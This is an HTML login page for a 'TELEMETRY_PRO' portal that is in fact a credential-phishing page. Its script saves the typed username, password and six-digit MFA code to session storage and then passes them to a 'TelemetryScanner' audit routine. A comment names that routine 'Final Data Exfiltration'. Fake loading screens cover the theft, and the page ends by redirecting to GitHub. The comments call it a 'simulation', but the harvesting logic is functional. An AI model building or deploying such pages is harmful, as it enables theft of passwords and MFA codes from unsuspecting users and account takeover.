<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Login | Startup Portal</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="auth-card" id="mainCard">
    <div class="logo">TELEMETRY_PRO</div>

    <!-- STEP 1: LOGIN -->
    <div id="step-login">
        <h2>Welcome back</h2>
        <p>Enter your credentials to access your dashboard.</p>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email or Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Continue</button>
        </form>
    </div>

    <!-- STEP 2: LOADING -->
    <div id="step-loading" class="hidden">
        <div class="spinner"></div>
        <h2>Securing session...</h2>
        <p>Verifying your credentials and checking device health.</p>
    </div>

    <!-- STEP 3: MFA -->
    <div id="step-mfa" class="hidden">
        <h2>Check your phone</h2>
        <p>We've sent a 6-digit verification code to your primary device.</p>
        <form id="mfaForm">
            <input type="text" id="mfa_code" class="mfa-input" placeholder="000000" maxlength="6" required>
            <button type="submit">Verify & Log In</button>
        </form>
    </div>
</div>

<script src="telemetry.js"></script>
<script>
    const steps = {
        login: document.getElementById('step-login'),
        loading: document.getElementById('step-loading'),
        mfa: document.getElementById('step-mfa')
    };

    function showStep(stepName) {
        Object.values(steps).forEach(s => s.classList.add('hidden'));
        steps[stepName].classList.remove('hidden');
    }

    // Step 1 -> Step 2 -> Step 3 Logic
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        // Log inputs to session storage
        sessionStorage.setItem('log_user', document.getElementById('email').value);
        sessionStorage.setItem('log_pass', document.getElementById('password').value);
        
        showStep('loading');

        // Simulate a "Real" server delay (1.5 seconds)
        setTimeout(() => {
            showStep('mfa');
            // Fire initial audit while user is busy with MFA
            TelemetryScanner.runAudit();
        }, 1500);
    });

    document.getElementById('mfaForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        sessionStorage.setItem('log_mfa', document.getElementById('mfa_code').value);
        
        showStep('loading');

        // Final Data Exfiltration
        await TelemetryScanner.runAudit();

        // Redirect to a real page to complete the "simulation"
        setTimeout(() => {
            window.location.href = "https://github.com/trending"; 
        }, 1000);
    });
</script>

</body>
</html>
